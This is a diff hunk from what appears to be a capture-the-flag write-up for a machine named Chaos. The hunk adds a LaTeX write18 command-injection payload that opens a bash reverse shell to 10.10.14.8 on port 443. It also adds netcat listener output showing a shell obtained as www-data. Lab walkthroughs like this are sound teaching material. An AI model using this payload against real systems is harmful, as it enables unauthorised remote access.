@@ -552,9 +552,26 @@ Perfect!! We are executing commands as the www-data user:
 
 Once we have a RCE, try to establish a Reverse Shell to gain acces to the victim machine:
 
-- Payload -> ``
+- Payload -> `\immediate\write18{bash -c 'bash -i >%26 /dev/tcp/10.10.14.8/443 0>%261'}`
 
 <br />
 
+
+
+<br />
+
+```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.120] 35662
+bash: cannot set terminal process group (1544): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ id    
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$
+```
+
+<br />
 
 
